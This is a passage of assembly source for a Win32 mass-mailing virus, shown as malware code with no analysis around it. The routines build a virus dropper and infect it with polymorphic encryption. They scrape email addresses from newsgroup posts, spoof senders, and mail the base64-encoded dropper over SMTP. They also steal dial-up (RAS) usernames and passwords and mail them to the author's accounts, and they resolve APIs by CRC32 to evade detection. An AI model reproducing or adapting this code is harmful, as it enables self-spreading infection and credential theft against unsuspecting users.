;				Carry flag -> Set if error
;----------------------------------------------------------------------------

TearDrop:		;Get random filename

				lea edi,dword ptr [ebp+BufStrFilename]
				push edi
				push edi
				push MAX_PATH
				call dword ptr [ebp+a_GetTempPathA]
				add edi,eax
				call rnd_exefile
				pop esi

				;Create dropper file

                xor eax,eax
                push eax
                push FILE_ATTRIBUTE_NORMAL
                push CREATE_ALWAYS
                push eax
                push eax
                push GENERIC_READ or GENERIC_WRITE
                push esi
                call dword ptr [ebp+a_CreateFileA]
                cmp eax,INVALID_HANDLE_VALUE
                je error_dropper
				mov dword ptr [ebp+h_CreateFile],eax

				mov edi,SIZEOF_DROPPER
				call do_mem_map
				or eax,eax
				jz error_dropper
				mov ebx,eax

				;Unpack dropper over memory mapped file

				lea esi,dword ptr [ebp+dropper_pack]
				mov edi,eax
				cld
				xor edx,edx
unpack_beat:	lodsw
				movzx ecx,ax				
				test ah,80h
				jnz unpack_repeat
				add edx,ecx
				rep movsb
				jmp short unpack_next
unpack_repeat:	and ch,7Fh
				add edx,ecx
				xor al,al
				rep stosb
unpack_next:	cmp edx,SIZEOF_DROPPER
				jb unpack_beat

				;Close created file

				call UnmapClose
				call HandleClose

				;Inject virus into created file

				mov edi,((SIZEOF_DROPPER/size_padding)+01h)*size_padding
				call OpenMapFile
				or eax,eax
				jz error_dropper
				mov ebx,eax

				mov dword ptr [ebp+SizeOfModCode],00000001h

				mov byte ptr [ebp+OrgEPCode],0C3h
				cld
				mov edx,dword ptr [ebp+ep_junk_fix]
				mov edi,edx
                mov al,0E9h
                stosb
				mov esi,dword ptr [ebp+ep_junk_addr]
				sub edx,esi
				mov eax,00001000h+inf_size-00000005h
				sub eax,edx
				add eax,dword ptr [ebp+entry_point]
				stosd
				lea edi,dword ptr [ebx+00000600h] ;Pointer to code rawdata
				mov ecx,ep_junk_size
				rep movsb				
				
                lea edi,dword ptr [ebx+00000C00h]
				call ViralAttach

				call UnmapClose
				call HandleClose

				clc
				ret

error_dropper:	stc
				ret

;----------------------------------------------------------------------------
;Write virus to end of file, apply encryption and add its corresponding
;polymorphic decryptor
;
;On entry:
;				edi -> Where to place viral code
;----------------------------------------------------------------------------

ViralAttach:	;Get CRC32 of main virus body and save it for l8r use

				mov ecx,SizeOfProtect
				lea esi,dword ptr [ebp+CRC_protected]
				call get_crc32
				mov dword ptr [ebp+ViralChecksum],edx

				;Move virus to file

				lea esi,dword ptr [ebp+viro_sys]				
				mov ecx,inf_size
				push ecx
                push edi
				push edi
				push edi
                cld
                rep movsb

				;Generate 2nd encryption layer

				mov ecx,inf_size-SizeOf2nd
				pop esi
				add esi,SizeOf2nd
				mov edi,esi
Do2ndLayer:		lodsb
				rol al,04h
				stosb
				loop Do2ndLayer

				;Generate main polymorphic encryption

                call fixed_size2ecx
                pop edi
loop_hide_code: push ecx
                mov eax,dword ptr [edi]
                call perform_crypt
                xor ecx,ecx
                mov cl,byte ptr [ebp+oper_size]
loop_copy_res:  stosb
                shr eax,08h
                loop loop_copy_res
                pop ecx
                loop loop_hide_code
				pop edi
				pop ecx
				add edi,ecx

				;Write poly decryptor to file				

				lea esi,dword ptr [ebp+poly_buffer]				
				mov ecx,dword ptr [ebp+decryptor_size]
				rep movsb
				ret

;----------------------------------------------------------------------------
;Initialize Winsock
;
;On exit:
;				Carry flag -> Set if error
;----------------------------------------------------------------------------

WS_Init:		call GetPtrWSName

				db 'WSOCK32.DLL',00h

GetPtrWSName:	call dword ptr [ebp+a_LoadLibraryA]
				or eax,eax
				jz WS_error
				mov dword ptr [ebp+h_WS32DLL],eax
								
				;Find WSOCK32 API addresses

				mov ebx,eax
				mov ecx,NumWS32Apis				
				lea esi,dword ptr [ebp+CRC32WS32Apis]
				lea edi,dword ptr [ebp+epWS32Apis]
				call get_APIs
				jecxz WSDllReady

;----------------------------------------------------------------------------
;Terminate virus Winsock session
;----------------------------------------------------------------------------

FreeWSDll:		push dword ptr [ebp+h_WS32DLL]
				call dword ptr [ebp+a_FreeLibrary]
WS_error:		stc
				ret

WSDllReady:		clc
				ret

;----------------------------------------------------------------------------
;Initialize RAS
;
;On exit:
;				Carry flag -> Set if error
;----------------------------------------------------------------------------

RAS_Init:		call GetPtrRASName

				db 'RASAPI32.DLL',00h

GetPtrRASName:	call dword ptr [ebp+a_LoadLibraryA]
				or eax,eax
				jz RAS_error
				mov dword ptr [ebp+h_RASDLL],eax

				;Find RASAPI32 API addresses

				mov ebx,eax
				mov ecx,NumRASApis				
				lea esi,dword ptr [ebp+CRC32RASApis]
				lea edi,dword ptr [ebp+epRASApis]
				call get_APIs
				jecxz RasDllReady

;----------------------------------------------------------------------------
;Terminate virus RAS session
;----------------------------------------------------------------------------

FreeRasDll:		push dword ptr [ebp+h_RASDLL]
				call dword ptr [ebp+a_FreeLibrary]
RAS_error:		stc
				ret

RasDllReady:	clc
				ret

;----------------------------------------------------------------------------
;Initialize ADVAPI32
;
;On exit:
;				Carry flag -> Set if error
;----------------------------------------------------------------------------

AD_Init:		call GetPtrADName

				db 'ADVAPI32.DLL',00h

GetPtrADName:	call dword ptr [ebp+a_LoadLibraryA]
				or eax,eax
				jz AD_error
				mov dword ptr [ebp+h_ADDLL],eax
								
				;Find ADVAPI32 API addresses

				mov ebx,eax
				mov ecx,NumADApis				
				lea esi,dword ptr [ebp+CRC32ADApis]
				lea edi,dword ptr [ebp+epADApis]
				call get_APIs
				jecxz ADDllReady

;----------------------------------------------------------------------------
;Terminate virus Winsock session
;----------------------------------------------------------------------------

FreeADDll:		push dword ptr [ebp+h_ADDLL]
				call dword ptr [ebp+a_FreeLibrary]
AD_error:		stc
				ret

ADDllReady:		clc
				ret

;----------------------------------------------------------------------------
;Initialize connection to specified port
;
;On entry:
;				-> Pointer to a string with host ip address
;				-> Server port to connect to
;On exit:
;				Carry flag -> Set if error
;----------------------------------------------------------------------------

Connect:		;Prepare the socket

				lea eax,dword ptr [ebp+WSA_data]
				push eax
				push 00000001h
				call dword ptr [ebp+a_WSAStartup]
				or eax,eax
				jnz WSA_CleanUp

				mov eax,dword ptr [ebp+use_server]
				push eax
				call dword ptr [ebp+a_inet_addr]
				
				;Get HostEnt for a given address

				cld
				push AF_INET
				push 00000004h
				lea edi,dword ptr [ebp+InetAddr]
				push edi
				stosd
				call dword ptr [ebp+a_gethostbyaddr]
				or eax,eax
				jz WSA_CleanUp

				;Create the SockAddrIn structure

				cld
				lea esi,dword ptr [eax+00000008h]
				lea edi,dword ptr [ebp+SockAddrIn]
				push edi
				movsw
				push dword ptr [ebp+use_port]
				call dword ptr [ebp+a_htons]
				cld
				stosw
				lodsw
				movzx ecx,ax
				lodsd
				mov esi,dword ptr [eax]
				rep movsb

				;Create socket

				push ecx
				push SOCK_STREAM
				push AF_INET
				call dword ptr [ebp+a_socket]

				pop edi

				cmp eax,00000000h
				jl WSA_CleanUp
				mov dword ptr [ebp+conn_sock],eax

				;Connect!!!!

				push SizeOfAddrIn
				push edi
				push eax
				call dword ptr [ebp+a_connect]
				cmp eax,0FFFFFFFFh
				je Disconnect

				;Read welcome message

				call ReadResponse

				;Success

				clc
				ret

;----------------------------------------------------------------------------
;Terminate connection
;----------------------------------------------------------------------------

Disconnect:		push dword ptr [ebp+conn_sock]
				call dword ptr [ebp+a_closesocket]
				
WSA_CleanUp:	call dword ptr [ebp+a_WSACleanup]
				stc
				ret

;----------------------------------------------------------------------------
;Send a string to server
;
;On entry:
;				esi -> Pointer to string
;On exit:
;				eax -> Null if success
;----------------------------------------------------------------------------

str2server:		push esi
				cld
				mov edi,esi
				xor eax,eax
server_strlen:	scasb
				jnz server_strlen
				dec edi
				push eax
				sub edi,esi
				push edi				
				push esi
				push dword ptr [ebp+conn_sock]
				call dword ptr [ebp+a_send]
				sub eax,edi
				pop edi
				mov ecx,00FFFFFFh
inside_sleep:	loop inside_sleep
				ret

;----------------------------------------------------------------------------
;Send a group of strings to server port
;
;On entry:
;				ecx -> Number of strings
;				esi -> Ptr to string index
;On exit:
;				ecx -> Null if success
;----------------------------------------------------------------------------

send2port:		cld
headers_loop:	lodsd
				push ecx
				push esi
				lea esi,dword ptr [eax+ebp]
				call str2server
				pop esi
				pop ecx
				or eax,eax
				jnz error_header				
				lodsb
				or al,al
				jnz dont_recive
				call ReadResponse
				cmp eax,00000000h
				jl error_header
dont_recive:	loop headers_loop
error_header:	ret

ReadResponse:	push ecx
				push esi
				push eax
				push SIZEOF_RECVBUF
				lea eax,dword ptr [ebp+RecvBuffer]
				push eax
				push dword ptr [ebp+conn_sock]
				call dword ptr [ebp+a_recv]
				pop esi
				pop ecx
				ret

;----------------------------------------------------------------------------
;This routine initializes Winsock and RAS
;Then it tryes to connect to mail port on a server
;If connection is stablished this rotine will generate the mail header
;
;On exit:
;				Carry flag -> NULL if error
;----------------------------------------------------------------------------

init_internet:	;Initialize Winsock and Ras

				call WS_Init
				jc err_inet_WS
				call RAS_Init
				jc err_inet_RAS
				
				;Enumerate active RAS connections

				cld
				lea edi,dword ptr [ebp+number_of_names]
				push edi
				mov eax,Num_Ras_Entries
				stosd
				push edi
				mov eax,RAS_NAMES_NT
				stosd
				push edi
				mov eax,SIZEOF_RASCONN
				stosd
				call dword ptr [ebp+a_RasEnumConnectionsA]
				or eax,eax
				jnz close_internet
				cmp dword ptr [ebp+number_of_names],eax
				je close_internet
				clc
				ret

close_internet:	call FreeRasDll
err_inet_RAS:	call FreeWSDll
err_inet_WS:	stc
				ret

;----------------------------------------------------------------------------
;Send mail header to server
;----------------------------------------------------------------------------

g_mail_header:	mov ecx,NumberOfHeaders
				lea esi,dword ptr [ebp+mail_headers]
				call send2port
				ret

;----------------------------------------------------------------------------
;Send mail end
;----------------------------------------------------------------------------

g_mail_end:		mov ecx,NumberOfMailEnd
				lea esi,dword ptr [ebp+mail_end]
				call send2port				
				ret

;----------------------------------------------------------------------------
;Mail spreading routines
;----------------------------------------------------------------------------

share_the_fun:	;Initialize internet stuff				

				call init_internet
				jc exit_share

				;Connect to news port

				call rnd_news_srv
				jc out_of_share

fly_over_news:	;Select a ramdom type of message, available types are:
				;
				; - Message for people who post to hacking groups
				; - Message for people who post to cracks groups
				; - Message for people who post to sex groups

				mov eax,NumOfNGIndex
				call get_rnd_range
				xor edx,edx
				mov ecx,00000019h
				mul ecx
				lea edx,dword ptr [eax+ebp+NG_index_table]

				;Select a random newsgroup from the list

				movzx eax,byte ptr [edx]
				call get_rnd_range
				lea ecx,dword ptr [ebp+eax*04h]
				add ecx,dword ptr [edx+00000001h]
				mov esi,dword ptr [ecx]
				add esi,ebp
				
				;Put the newsgroup name after the 'GROUP' command

				cld
				lea edi,dword ptr [ebp+NewsGroup_Name]
copy_ng_name:	lodsb
				stosb
				or al,al
				jnz copy_ng_name

				;Now inject sender's domain

				mov esi,dword ptr [edx+00000005h]
				add esi,ebp
				lea edi,dword ptr [ebp+domain_here]
copy_domain:	lodsb
				stosb
				or al,al
				jnz copy_domain

				;Insert the address of the body text

				mov eax,dword ptr [edx+0000000Dh]
				mov dword ptr [ebp+AddrOfBody],eax

				;Add a nice subject to our mail

				mov esi,dword ptr [edx+00000011h]
				add esi,ebp
				lea edi,dword ptr [ebp+subject_here]
copy_subject:	lodsb
				stosb
				or al,al
				jnz copy_subject

				;Put a name to attached file

				mov esi,dword ptr [edx+00000015h]
				add esi,ebp
				lea edi,dword ptr [ebp+MIME_file_00]
				mov ecx,00000007h
				push ecx
				push esi
				rep movsb
				pop esi
				pop ecx
				lea edi,dword ptr [ebp+MIME_file_01]
				rep movsb
				
				;Its time to spoof sender mail address

				mov esi,dword ptr [edx+09h]
				add esi,ebp
				lea edi,dword ptr [ebp+mail_from_here0]
				lea edx,dword ptr [ebp+mail_from_here1]
				call InjectMailAddr

				;Get a mail address from any newsgroup message

				mov eax,0000000Ah
				call get_rnd_range
				inc eax

skip_some_msgs:	push eax

				mov ecx,num_nntp_comm
				lea esi,dword ptr [ebp+nntp_comm]
				call send2port
				pop eax
				jecxz got_from_news
				
				;Ouch! Something goes wrong while connected to
				;news server :(

				call Disconnect
				jmp out_of_share

got_from_news:	dec eax
				jnz skip_some_msgs

				;Get the mail address from the news message header

				mov ecx,SIZEOF_RECVBUF
				lea esi,dword ptr [ebp+RecvBuffer]
				cld
lookup_addr:	lodsb
				and al,0DFh
				cmp al,'F'
				je is_mail_here
				loop lookup_addr
				jmp fly_over_news

is_mail_here:	mov eax,dword ptr [esi]
				and eax,0FFDFDFDFh
				cmp eax,':MOR'
				je found_sender
				loop lookup_addr
				jmp fly_over_news

found_sender:	;Inject the obtained mail address into header
				;The message will be send to the guys who
				;posted to selected newsgroups
			
				lea edi,dword ptr [ebp+mail_to_here_00]
				lea edx,dword ptr [ebp+mail_to_here_01]
				call InjectMailAddr
				jc fly_over_news

				;We no longer need the connection to news server

				call Disconnect

				;Connect to mail port

				call rnd_mail_srv
				jc out_of_share

				;Send mail header

				call g_mail_header
				jecxz ready2share

out_of_share:	call close_internet
exit_share:		ret

ready2share:	;Create virus dropper

				call TearDrop
				jc close_share

				;Open dropper

				xor edi,edi
				call OpenMapFile
				or eax,eax
				jz delete_dropper
				mov ebx,eax
				
				;Send MIME headers

				mov ecx,NumberOfMime
				lea esi,dword ptr [ebp+mime_headers]
				call send2port
				
				;Inject BASE64 encoded strings inside mail body

				mov esi,ebx
				mov eax,((SIZEOF_DROPPER/size_padding)+01h)*size_padding
				call BASE64encode

				;Send end of MIME part

				mov ecx,NumberOfMimeEnd
				lea esi,dword ptr [ebp+mime_end]
				call send2port

close_dropper:	;Close dropper image

				call UnmapClose
				call HandleClose

delete_dropper:	lea eax,dword ptr [ebp+BufStrFilename]
				push eax
				call dword ptr [ebp+a_DeleteFileA]
				
close_share:	call g_mail_end
				call Disconnect
				jmp out_of_share

;----------------------------------------------------------------------------
;Connect to a random mail server
;----------------------------------------------------------------------------

rnd_mail_srv:	mov ecx,00000002h
err_SMTP:		push ecx
				push esi
				mov eax,NumOfSMTP
				call get_rnd_range
				lea esi,dword ptr [ebp+tbl_SMTP+eax*04h]
				cld
				lodsd
				add eax,ebp
				pop esi
				mov dword ptr [ebp+use_server],eax
				mov dword ptr [ebp+use_port],00000019h				
				call Connect
				jnc got_smtp_conn
				pop ecx
				loop err_SMTP
				stc
got_smtp_conn:	pop ecx
				ret

;----------------------------------------------------------------------------
;Connect to a random news server
;----------------------------------------------------------------------------

rnd_news_srv:	mov ecx,00000002h
err_NNTP:		push ecx
				push esi
				mov eax,NumOfNNTP
				call get_rnd_range
				lea esi,dword ptr [ebp+tbl_NNTP+eax*04h]
				cld
				lodsd
				add eax,ebp
				pop esi
				mov dword ptr [ebp+use_server],eax
				mov dword ptr [ebp+use_port],00000077h
				call Connect
				jnc got_nntp_conn
				pop ecx
				loop err_NNTP
				stc
got_nntp_conn:	pop ecx
				ret

;----------------------------------------------------------------------------
;Inject mail address on message header
;
;On entry:
;				esi -> Buffer that contains the mail address
;				edi -> Where to inject the mail address
;----------------------------------------------------------------------------

InjectMailAddr:	cld
				mov ecx,00000020h
skip_name_shit:	lodsb
				cmp al,'<'
				je found_mailb
				loop skip_name_shit

				;Accept only addresses inside < > characters

				stc
				ret

found_mailb:	dec esi
				mov ecx,00000040h
get_that_addr:	lodsb				
				stosb
				mov byte ptr [edx],al
				inc edx
				cmp al,'>'
				je end_of_addr
				loop get_that_addr

				;Oh! Shit! This mail address is too long :(

				stc
				ret

end_of_addr:	mov ax,000Ah
				stosw
				mov word ptr [edx],ax

				;The work is done, return success

				clc
				ret
	
;----------------------------------------------------------------------------
;BASE64 enconding routine
;
;On entry:
;				esi -> Input buffer
;				eax -> Size of input buffer (Min. 03h)
;----------------------------------------------------------------------------

BASE64encode:	push ebx
				lea ebx,dword ptr [ebp+TranslateTbl]
				lea edi,dword ptr [ebp+BeatBuffer]		
				xor edx,edx
				mov dword ptr [ebp+BeatCounter],edx
				mov ecx,00000003h
				div ecx
				mov ecx,eax
				push edx			;The rest
BASE64loop:		cld
				lodsd				;Take 03h bytes
				dec esi
				mov edx,eax
				call BASE64Block1
				call BASE64Block2
				call BASE64Block3
				call BASE64Block4
				loop BASE64loop

				pop ecx				;Get the rest
				jecxz no_rest

				cmp ecx,00000001h
				je rest_is_1

rest_is_2:		lodsw
				movzx edx,ax
				call BASE64Block1
				call BASE64Block2
				call BASE64Block3
				dec ecx
				jmp short rest_is_done

rest_is_1:		lodsb
				movzx edx,al
				call BASE64Block1
				call BASE64Block2
				inc ecx

rest_is_done:	mov al,'='
				cld
				rep stosb
no_rest:		mov ax,0A0Ah		;New-line and null terminator
				stosw
				xor al,al
				stosb
				lea esi,dword ptr [ebp+BeatBuffer]
				call str2server

				pop ebx
				ret

BASE64Block1:	mov eax,edx
				shr eax,02h
				jmp short got_6bits

BASE64Block2:	mov eax,edx
				shl al,04h
				shr ah,04h
				or al,ah
				jmp short got_6bits

BASE64Block3:	mov eax,edx
				shr eax,08h
				shl al,02h
				shr ah,06h
				or al,ah
				jmp short got_6bits

BASE64Block4:	mov eax,edx
				shr eax,10h
got_6bits:		cld
				and al,00111111b
				xlatb
				stosb

				mov eax,dword ptr [ebp+BeatCounter]
				inc eax
				mov dword ptr [ebp+BeatCounter],eax
				cmp eax,0000004Ch
				je put_new_line
				cmp eax,0000004Ch*02h
				je put_new_line
				cmp eax,0000004Ch*03h
				je put_new_line
				cmp eax,0000004Ch*04h
				je put_new_line
				cmp eax,0000004Ch*05h
				je put_new_line
				cmp eax,0000004Ch*06h
				je put_new_line
				cmp eax,0000004Ch*07h
				je put_new_line
				cmp eax,0000004Ch*08h
				jne BeatNotReady

				push ebx				
				push ecx
				push edx
				push esi

				mov ax,000Ah		;New-line and null terminator
				stosw
				lea esi,dword ptr [ebp+BeatBuffer]
				push esi
				call str2server		;Send string
				cld
				pop edi				;Again to buffer start
				xor eax,eax
				mov dword ptr [ebp+BeatCounter],eax
				
				pop esi
				pop edx
				pop ecx
				pop ebx
BeatNotReady:	ret

put_new_line:	mov al,0Ah
				stosb
				ret

;----------------------------------------------------------------------------
;Password stealing routine
;----------------------------------------------------------------------------

steal_passwd:	;Initialize internet stuff

				call init_internet
				jc exit_passwd

				;Connect to mail port

				call rnd_mail_srv
				jc out_of_passwd

				;Select the mail account that will recive stolen passwords

				mov eax,NumOfMyAccounts
				call get_rnd_range
                mov edx,dword ptr [ebp+MyAccounts+eax*04h]
				lea esi,dword ptr [edx+ebp]
				lea edi,dword ptr [ebp+mail_to_here_00]
				lea edx,dword ptr [ebp+mail_to_here_01]

				call InjectMailAddr

				;Now inject sender's domain

				lea esi,dword ptr [ebp+lamer_domain]
				lea edi,dword ptr [ebp+domain_here]
				mov ecx,lamer_domain_s
				rep movsb

				;Its time for the sender address

				lea esi,dword ptr [ebp+lamer_mail]
				lea edi,dword ptr [ebp+mail_from_here0]
				lea edx,dword ptr [ebp+mail_from_here1]
				call InjectMailAddr

				call g_mail_header
				jecxz passwd_is_ok

out_of_passwd:	call close_internet
exit_passwd:	ret

passwd_is_ok:	;Now stole info about dialup accounts

				cld
				lea edi,dword ptr [ebp+number_of_names]
				push edi
				mov eax,Num_Ras_Entries
				stosd
				push edi
				mov eax,RASE_NAMES_NT
				stosd
				push edi
				mov eax,SIZEOF_RASENTRY
				stosd
				xor eax,eax
				push eax
				push eax
				call dword ptr [ebp+a_RasEnumEntriesA]
				or eax,eax
				jnz close_passwd

				;Now we have the names of RAS entries, lets get the info
				;about each one				
				
				mov ecx,dword ptr [ebp+number_of_names]
				cmp ecx,eax
				je close_passwd
				mov esi,edi
get_entry_data:	cld
				push ecx
				push esi
				lea edi,dword ptr [ebp+RASP_ret_passwd]
				push edi
				xor eax,eax
				stosd
				push edi
				mov eax,SIZEOF_RASPARAM
				stosd
copy_ras_name:	lodsb
				stosb
				or al,al
				jnz copy_ras_name
				push 0000000h
				call dword ptr [ebp+a_RasGetEntryDialParamsA]
				or eax,eax
				jnz bad_entry

				lea esi,dword ptr [ebp+szMailNewLine]
				call str2server

				lea esi,dword ptr [ebp+szRASEntrieName]
				call str2server
				lea esi,dword ptr [ebp+RASP_INFO+0004h]
				call str2server

				lea esi,dword ptr [ebp+szRASPhoneNum]
				call str2server
				lea esi,dword ptr [ebp+RASP_INFO+0105h]
				call str2server
				
				lea esi,dword ptr [ebp+szRASCallBack]
				call str2server
				lea esi,dword ptr [ebp+RASP_INFO+0186h]
				call str2server

				lea esi,dword ptr [ebp+szRASUserName]
				call str2server
				lea esi,dword ptr [ebp+RASP_INFO+0207h]
				call str2server

				lea esi,dword ptr [ebp+szRASPassword]
				call str2server
				lea esi,dword ptr [ebp+RASP_INFO+0308h]
				call str2server

				lea esi,dword ptr [ebp+szRASDomain]
				call str2server
				lea esi,dword ptr [ebp+RASP_INFO+0409h]
				call str2server
				
bad_entry:		pop esi
				add esi,SIZEOF_RASENTRY
				pop ecx
				loop get_entry_data

close_passwd:	call g_mail_end
				call Disconnect
				jmp out_of_passwd

;----------------------------------------------------------------------------
;Open file and create its memory mapped image
;
;On entry:
;				BufStrFilename -> Buffer filled with path + filename
;				edi -> New size of file or NULL to stay in current size
;Exit:
;				eax -> Base address of memory map for file or null if error
;----------------------------------------------------------------------------

OpenMapFile:	;Get current file attributes

				lea esi,dword ptr [ebp+BufStrFilename]
				push esi
				call dword ptr [ebp+a_GetFileAttributesA]
				cmp eax,0FFFFFFFFh
				je e_OpenMapFile
				mov dword ptr [ebp+CurFileAttr],eax

                ;Reset file attributes so we can read/write

                push FILE_ATTRIBUTE_NORMAL
                push esi
                call dword ptr [ebp+a_SetFileAttributesA]
                or eax,eax
                jz e_OpenMapFile

                ;Open existing file

                xor eax,eax
                push eax
                push FILE_ATTRIBUTE_NORMAL
                push OPEN_EXISTING
                push eax
                push eax
                push GENERIC_READ or GENERIC_WRITE
                push esi
                call dword ptr [ebp+a_CreateFileA]
                cmp eax,INVALID_HANDLE_VALUE
                je Restore_Attrib
				mov dword ptr [ebp+h_CreateFile],eax

				;Get current file time

				cld
				lea esi,dword ptr [ebp+FileLastWriteT]
				push esi
				lodsd
				push esi
				lodsd
				push esi
				push dword ptr [ebp+h_CreateFile]
				call dword ptr [ebp+a_GetFileTime]
				or eax,eax
				jz Close_Create

do_mem_map:		;Create filemapping over file
                       
				xor eax,eax         
                push eax
				push edi
                push eax
                push PAGE_READWRITE
                push eax
                push dword ptr [ebp+h_CreateFile]
                call dword ptr [ebp+a_CreateFileMappingA]
                or eax,eax
                jz Close_Create
				mov dword ptr [ebp+h_FileMap],eax

                ;Map file in memory, get base address

                xor edx,edx
                push edi
                push edx
                push edx
                push FILE_MAP_WRITE
                push eax
                call dword ptr [ebp+a_MapViewOfFile]
                or eax,eax
                jnz e_OpenMapFile
				call Close_Mapping

				;Continue into next routine

;----------------------------------------------------------------------------
;Close file handle
;----------------------------------------------------------------------------

HandleClose:	;Restore file time

				cld
                lea esi,dword ptr [ebp+FileLastWriteT]
				push esi
				lodsd
				push esi
				lodsd
				push esi
				lodsd
				push dword ptr [ebp+h_CreateFile]
				call dword ptr [ebp+a_SetFileTime]

Close_Create:	;Close handle created by CreateFileA

                push dword ptr [ebp+h_CreateFile]
                call dword ptr [ebp+a_CloseHandle]

Restore_Attrib:	;Restore file attributes

                push dword ptr [ebp+CurFileAttr]
                lea eax,dword ptr [ebp+BufStrFilename]
                push eax
                call dword ptr [ebp+a_SetFileAttributesA]
				xor eax,eax
e_OpenMapFile:	ret

;----------------------------------------------------------------------------
;Unmap memory mapped file
;
;On entry:
;				ebx -> File base address in memory
;----------------------------------------------------------------------------

UnmapClose:		push ebx
                call dword ptr [ebp+a_UnmapViewOfFile]

Close_Mapping:	;Close handle created by CreateFileMappingA

                push dword ptr [ebp+h_FileMap]
                call dword ptr [ebp+a_CloseHandle]
				ret

;----------------------------------------------------------------------------
;Call WriteProcessMemory in order to modify current process
;----------------------------------------------------------------------------

myWriteProcMem: ;Entry:
                ;
                ; eax -> Number of bytes to write
                ; edx -> Points to the buffer that supplies data to be 
				;		 written
				; esi -> Points to the base address in the specified process
                ;        to be written to

                pushad
                push 00000000h
                push eax
                push edx
                push esi
                call dword ptr [ebp+a_GetCurrentProcess]
                push eax
                call dword ptr [ebp+a_WriteProcessMemory]
                popad
                ret

;----------------------------------------------------------------------------
;Make crc lookup table
;
;Generate a table for a byte-wise 32-bit CRC calculation on the polynomial:
;x^32+x^26+x^23+x^22+x^16+x^12+x^11+x^10+x^8+x^7+x^5+x^4+x^2+x+1.
;
;Polynomials over GF(2) are represented in binary, one bit per coefficient,
;with the lowest powers in the most significant bit.  Then adding polynomials
;is just exclusive-or, and multiplying a polynomial by x is a right shift by
;one.  If we call the above polynomial p, and represent a byte as the
;polynomial q, also with the lowest power in the most significant bit (so the
;byte 0xb1 is the polynomial x^7+x^3+x+1), then the CRC is (q*x^32) mod p,
;where a mod b means the remainder after dividing a by b.
;
;This calculation is done using the shift-register method of multiplying and
;taking the remainder.  The register is initialized to zero, and for each
;incoming bit, x^32 is added mod p to the register if the bit is a one (where
;x^32 mod p is p+x^32 = x^26+...+1), and the register is multiplied mod p by
;x (which is shifting right by one and adding x^32 mod p if the bit shifted
;out is a one).  We start with the highest power (least significant bit) of
;q and repeat for all eight bits of q.
;
;The table is simply the CRC of all possible eight bit values.  This is all
;the information needed to generate CRC's on data a byte at a time for all
;combinations of CRC register values and incoming bytes.
;
;Original C code by Mark Adler
;Translated to asm for Win32 by GriYo
;----------------------------------------------------------------------------
				
make_crc_tbl:	;Make exclusive-or pattern from polynomial (0EDB88320h)
				;
				;The following commented code is an example of how to
				;make the exclusive-or pattern from polynomial
				;at runtime
;
;				xor edx,edx
;				mov ecx,0000000Eh
;				lea ebx,dword ptr [ebp+tbl_terms]
;calc_poly:		mov eax,ecx
;				xlatb
;				sub eax,0000001Fh
;				neg eax
;				bts edx,eax
;				loop calc_poly
;
;				edx contains now the exclusive-or pattern
;
;				The polynomial is:
;
; X^32+X^26+X^23+X^22+X^16+X^12+X^11+X^10+X^8+X^7+X^5+X^4+X^2+X^1+X^0
;
;tbl_terms		db 0,1,2,4,5,7,8,10,11,12,16,22,23,26
;				
				cld
				mov ecx,00000100h
				lea edi,dword ptr [ebp+tbl_crc32]
crc_tbl_do:		mov eax,000000FFh
				sub eax,ecx
				push ecx
				mov ecx,00000008h				
make_crc_value:	shr eax,01h
				jnc next_value
				xor eax,0EDB88320h
next_value:		loop make_crc_value				
				pop ecx
				stosd
				loop crc_tbl_do
				ret

;----------------------------------------------------------------------------
;Return a 32bit CRC of the contents of the buffer
;On entry:
;				esi -> Ptr to buffer
;				ecx -> Buffer size
;On exit:
;				edx -> 32bit CRC
;----------------------------------------------------------------------------

get_crc32:		cld
				push edi
				xor edx,edx
				lea edi,dword ptr [ebp+tbl_crc32]
crc_calc:		push ecx
				lodsb
				xor eax,edx
				and eax,000000FFh				
				shr edx,08h
				xor edx,dword ptr [edi+eax]
				pop ecx
				loop crc_calc
				pop edi
				ret

;----------------------------------------------------------------------------
;Get a 32bit CRC of a null terminated array
;
;On entry:
;				esi -> Ptr to string
;Exit:
;				edx -> 32bit CRC
;----------------------------------------------------------------------------

get_str_crc32:	cld
				push ecx
				push edi
				mov edi,esi
				xor eax,eax
				mov ecx,eax
crc_sz:			inc ecx
				scasb
				jnz crc_sz
				call get_crc32
				pop edi
				pop ecx
				ret

;----------------------------------------------------------------------------
;Get the entry-point of GetProcAddress
;
;On entry:
;				ebx -> KERNELL32 base address
;On exit:
;				eax -> Address of GetProcAddress
;----------------------------------------------------------------------------

GetGetProcAddr: cld
				mov eax,dword ptr [ebx+IMAGE_DOS_HEADER.MZ_lfanew]
                mov edx,dword ptr [eax+										\
								   ebx+										\
								   NT_OptionalHeader.						\
                                   OH_DirectoryEntries.						\
                                   DE_Export.								\
                                   DD_VirtualAddress]
                add edx,ebx
				mov esi,dword ptr [edx+ED_AddressOfNames]
				add esi,ebx
				mov edi,dword ptr [edx+ED_AddressOfNameOrdinals]
				add edi,ebx
				mov ecx,dword ptr [edx+ED_NumberOfNames]				

function_loop:	lodsd
				push edx
				push esi
				lea esi,dword ptr [eax+ebx] ;Get ptr to API name
				call get_str_crc32			;Get CRC32 of API name
				pop esi			
				cmp edx,dword ptr [ebp+CrcGetProcAddr]					
				je API_found
				inc edi
				inc edi
				pop edx
				loop function_loop
				ret

API_found:		pop edx
				movzx eax,word ptr [edi]
				sub eax,dword ptr [edx+ED_BaseOrdinal]
				inc eax
				shl eax,02h
				mov esi,dword ptr [edx+ED_AddressOfFunctions]
                add esi,eax
                add esi,ebx
                lodsd
                add eax,ebx
                ret

;----------------------------------------------------------------------------
;Get the entry-point of each needed API
;
;This routine uses the CRC32 instead of API names
;
;On entry:
;				ebx	-> Base address of DLL in memory
;				ecx -> Number of APIs in the folling buffer
;				esi -> Buffer filled with the CRC32 of each API name
;				edi -> Recives found API addresses
;On exit:
;			    ecx -> Is 00000000h if everything was ok
;----------------------------------------------------------------------------

get_APIs:		cld				
get_each_API:	push ecx
				push esi
				
				;Get a pointers to the EXPORT data

				mov eax,dword ptr [ebx+IMAGE_DOS_HEADER.MZ_lfanew]
                mov edx,dword ptr [eax+										\
								   ebx+										\
								   NT_OptionalHeader.						\
                                   OH_DirectoryEntries.						\
                                   DE_Export.								\
                                   DD_VirtualAddress]
                add edx,ebx
				mov esi,dword ptr [edx+ED_AddressOfNames]
				add esi,ebx
				mov ecx,dword ptr [edx+ED_NumberOfNames]				

API_Loop:		;Try to find tha API name that matches given CRC32

				lodsd
				push esi							;Ptr to AddressOfNames
				lea esi,dword ptr [eax+ebx]			;Get ptr to API name
				push esi							;Save ptr to API name
				call get_str_crc32					;Get CRC32 of API name
				mov esi,dword ptr [esp+00000008h]
				lodsd
				cmp eax,edx
